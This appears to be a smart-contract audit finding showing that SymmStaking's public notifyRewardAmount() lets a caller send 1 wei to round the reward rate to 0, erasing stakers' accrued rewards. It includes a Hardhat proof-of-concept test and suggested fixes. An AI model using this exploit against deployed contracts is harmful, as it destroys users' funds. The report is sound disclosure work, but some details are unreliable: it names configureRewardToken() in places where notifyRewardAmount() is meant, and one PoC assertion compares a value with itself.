# SymmStaking.sol :: notifyRewardAmount() an attacker can set the rate to 0 causing users to lose their accumulated rewards.

### Summary

`notifyRewardAmount()` is responsible for adding new rewards to the contract. However, since it can be called by anyone, a malicious user can exploit this by setting `state.rate` to 0, causing legitimate users to receive nothing when they attempt to claim their rewards.

### Root Cause

[notifyRewardAmount](https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/d7cf7fc96af1c25b53a7b500a98b411cd018c0d3/token/contracts/staking/SymmStaking.sol#L275-L292) is implemented as shown below, and as you can see, it can be called by anyone.
```solidity
function notifyRewardAmount(address[] calldata tokens, uint256[] calldata amounts) external nonReentrant whenNotPaused {
		_updateRewardsStates(address(0));
		if (tokens.length != amounts.length) revert ArraysMismatched();

		uint256 len = tokens.length;
		for (uint256 i = 0; i < len; i++) {
			address token = tokens[i];
			uint256 amount = amounts[i];

			if (amount == 0) continue;
			if (!isRewardToken[token]) revert TokenNotWhitelisted(token);

			IERC20(token).safeTransferFrom(msg.sender, address(this), amount);
			pendingRewards[token] += amount;
			_addRewardsForToken(token, amount);
		}
		emit RewardNotified(tokens, amounts);
	}
```
`_addRewardsForToken()` is called to update the rate based on the newly added rewards.
```solidity
function _addRewardsForToken(address token, uint256 amount) internal {
		TokenRewardState storage state = rewardState[token];

		if (block.timestamp >= state.periodFinish) {
			state.rate = amount / state.duration; 
		} else {
			uint256 remaining = state.periodFinish - block.timestamp;
			uint256 leftover = remaining * state.rate;
			state.rate = (amount + leftover) / state.duration;
			
		}

		state.lastUpdated = block.timestamp;
		state.periodFinish = block.timestamp + state.duration;
	}
```
As you can see, when the new `state.rate` is calculated using the leftover rewards plus the new amount, if the sum of `leftover + amount < state.duration`, it will round down to 0, causing the rate to become 0. This can happen in tree scenarios:

1. **First Scenario:** When new reward tokens are added using `configureRewardToken()`, a malicious user could call `notifyRewardAmount()` with just 1 wei. Since `DEFAULT_REWARDS_DURATION = 1 week = 604800 seconds`, dividing `1 wei / 604800s = 0`, causing the `state.rate` to be set to 0.

2. **Second Scenario :** When `leftover + amount < state.duration`, this happens because the leftover rewards decrease over time. An attacker can monitor the contract and, once the condition is met, call `configureRewardToken()` with 1 wei to intentionally round the rate down to 0.

3. **Third Scenario:** When `block.timestamp >= state.periodFinish`, an attacker can call the function with just 1 wei, which would set the rate to 0. This is because `state.rate = amount / state.duration`, and in this case, there are no leftover rewards to offset the calculation.

This is problematic because if the rate is set to 0 and a user calls `claimRewards()`, the user will receive 0 rewards. This happens because the rate being 0 results in the user losing the rewards earned during that period. 

Additionally, the token's [state.lastUpdated](https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/d7cf7fc96af1c25b53a7b500a98b411cd018c0d3/token/contracts/staking/SymmStaking.sol#L412-L413) is updated to the current time, and since the rate is 0, `rewardState[_rewardsToken].perTokenStored` remains unchanged. This results in the loss of all rewards accumulated during that period for all users.
```solidity
function rewardPerToken(address _rewardsToken) public view returns (uint256) {
		if (totalSupply == 0) {
			return rewardState[_rewardsToken].perTokenStored;
		}
		return
			rewardState[_rewardsToken].perTokenStored +
@>			(((lastTimeRewardApplicable(_rewardsToken) - rewardState[_rewardsToken].lastUpdated) * rewardState[_rewardsToken].rate * 1e18) /
				totalSupply);
	}
```
Given this, the attacker can first deposit 1 wei, set the rate to 0, and then call `claimRewards()`, causing all users to lose the rewards accumulated during that period. In essence, the attacker can manipulate the rate to 0 and immediately trigger `claimRewards()`, leading to a loss of rewards for all users.
### Internal Pre-conditions

1. The rewards token is enabled to call `notifyRewardAmount()` in order to distribute rewards in this token.

### External Pre-conditions

1. If `amount + leftover < state.duration`, the rate will be rounded down to 0. Alternatively, if `state.periodFinish` is reached, an attacker can send 1 wei of rewards to set the rate to 0.

### Attack Path

Attcker calls `notifyRewardAmount()` with 1 wei to round the rate calculation down to 0.

### Impact

Users who claim their rewards will forfeit the rewards accumulated during this period.

### PoC

To better understand the issue, please copy the followingPOC into `symmStaking.behavior.ts`.
```js
it("The rate can be set to 0 causing a loss of funds for users.", async function () {
			// Scenario: Single depositor â€” user1 deposits 604,800 SYMM, waits 200s, claims 200 tokens.

			//admin correctly configures the rewards, setting `state.rate = 1`, as `604,800 SYMM / 604,800s = 1`.
			const rewardAmount = "604800"
			await stakingToken.connect(admin).approve(await symmStaking.getAddress(), rewardAmount)
			await symmStaking.connect(admin).configureRewardToken(await stakingToken.getAddress(), true)
			await symmStaking.connect(admin).notifyRewardAmount([await stakingToken.getAddress()], [rewardAmount])

			const initalRewardState = await symmStaking.rewardState(stakingToken.getAddress());
			const initalRewardAccumulated = initalRewardState.perTokenStored
			//A malicious user configures the rewards to set state.rate to 0 sending 1 wei of rewards, as the calculation `604,798 SYMM (leftover) / 604,800s` results in 0.
			await stakingToken.connect(user1).approve(await symmStaking.getAddress(), 1)
			await symmStaking.connect(user1).notifyRewardAmount([await stakingToken.getAddress()], [1])

			const depositAmount = "604800"
			await time.increase(200)

			await stakingToken.connect(user2).approve(await symmStaking.getAddress(), depositAmount)
			await symmStaking.connect(user2).deposit(depositAmount, user1.address)

			await time.increase(200)

			//the user attempts to claim their rewards but receives nothing because the rate is set to 0, causing them to lose all the rewards accumulated during this period
			const user2BalanceBefore = await stakingToken.balanceOf(user2.address)
			await symmStaking.connect(user2).claimRewards()
			const user2BalanceAfter = await stakingToken.balanceOf(user2.address)
			const claimed = user2BalanceAfter - user2BalanceBefore

			const currentBlock = await ethers.provider.getBlock("latest")
			const currentTime = currentBlock?.timestamp
			const rewardState = await symmStaking.rewardState(stakingToken.getAddress());
			const lastUpdated = rewardState.lastUpdated;
			const finalRewardAccumulated = initalRewardState.perTokenStored

			expect(claimed).to.equal("0")
			expect(await symmStaking.getFullPeriodReward(await stakingToken.getAddress())).to.equal("0")
			
			//time is actualized to the current time
			expect(lastUpdated).to.equal(currentTime)
			//time has passed, but the accumulated rewards remain the same, resulting in a loss of rewards for all users
			expect(initalRewardAccumulated).to.equal(finalRewardAccumulated)
		})
```

### Mitigation

Here are two potential solutions: 

The first is to restrict the `configureRewardToken()` to be called only by a trusted entity. 

The second is to ensure that the rate is never calculated as 0, and if it is, the transaction should be reverted.
